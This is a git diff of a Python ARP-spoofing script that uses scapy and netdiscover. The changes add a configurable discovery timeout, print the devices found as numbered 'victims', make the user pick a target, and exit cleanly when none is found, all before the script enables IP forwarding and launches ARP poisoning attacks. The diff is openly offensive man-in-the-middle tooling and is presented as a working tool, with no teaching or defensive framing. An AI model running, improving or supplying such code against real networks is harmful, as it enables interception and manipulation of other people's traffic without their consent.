@@ -6,6 +6,7 @@ import argparse
 import logging
 import socket
 import subprocess
+import signal
 from scapy.all import *
 
 doggy = """
@@ -41,18 +42,21 @@ def get_local_ip():
         logging.error("Failed to fetch the local IP address")
         sys.exit(1)
 
-def sniff_packets(interface, count=10):
-    logging.info("Sniffing packets on interface %s...", interface)
+def sniff_packets(interface, count=10, duration=10):
+    logging.info("Sniffing packets on interface %s for %d seconds...", interface, duration)
     try:
-        result = subprocess.run(['netdiscover', '-i', interface, '-c', str(count), '-P'], capture_output=True, text=True)
-        if result.returncode == 0:
-            return result.stdout.splitlines()
+        process = subprocess.Popen(['netdiscover', '-i', interface, '-c', str(count), '-P'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, _ = process.communicate(timeout=duration)
+        if process.returncode == 0:
+            return output.decode().splitlines()
         else:
             logging.error("Failed to sniff packets using netdiscover")
             return []
-    except Exception as e:
-        logging.error("An error occurred while sniffing packets using netdiscover: %s", e)
-        return []
+    except subprocess.TimeoutExpired:
+        logging.info("Netdiscover timed out after %d seconds", duration)
+        os.kill(process.pid, signal.SIGINT)
+        output, _ = process.communicate()
+        return output.decode().splitlines()
 
 def extract_victim_info(output_lines):
     victim_ips = set()
@@ -80,14 +84,22 @@ def select_victim(victim_ips, victim_macs):
     print("Invalid choice. Please enter a valid number.")
     return None
 
-def get_victim_info(interface):
-    output_lines = sniff_packets(interface)
+def get_victim_info(interface, duration):
+    output_lines = sniff_packets(interface, duration=duration)
     victim_ips, victim_macs = extract_victim_info(output_lines)
+    if not victim_ips:
+        logging.info("No victims found during the specified duration.")
+        sys.exit(0)
+
+    print("Detected Devices:")
+    for i, (ip, mac) in enumerate(zip(victim_ips, victim_macs), 1):
+        print(f"{i}. IP: {ip}, MAC: {mac}")
+
     victim_ip = select_victim(list(victim_ips), list(victim_macs))
-    if victim_ip:
-        logging.info("Selected victim IP: %s", victim_ip)
-    else:
+    if not victim_ip:
         logging.error("Failed to select a victim.")
+        sys.exit(1)
+    logging.info("Selected victim IP: %s", victim_ip)
     return victim_ip
 
 def get_mac(ip):
@@ -147,6 +159,7 @@ def main(args):
     interface = args.interface
     verbose = args.verbose
     log_file = args.log_file
+    duration = args.duration
 
     setup_logging(verbose, log_file)
 
@@ -161,7 +174,7 @@ def main(args):
         enable_ip_forwarding()
         logging.info("Preparing to launch ARP attacks...")
 
-        victim_ip = get_victim_info(interface)
+        victim_ip = get_victim_info(interface, duration)
         if not victim_ip:
             sys.exit(1)
 
@@ -185,7 +198,7 @@ if __name__ == "__main__":
     parser.add_argument("-c", "--packet_count", type=int, default=100, help="Number of ARP packets to send (default: 100)")
     parser.add_argument("-p", "--interval", type=int, default=1, help="Interval between ARP packets (default: 1 second)")
     parser.add_argument("-l", "--log_file", help="File to write log output")
+    parser.add_argument("-d", "--duration", type=int, default=10, help="Duration (in seconds) to run netdiscover (default: 10 seconds)")
     args = parser.parse_args()
     print(doggy)
     main(args)
-
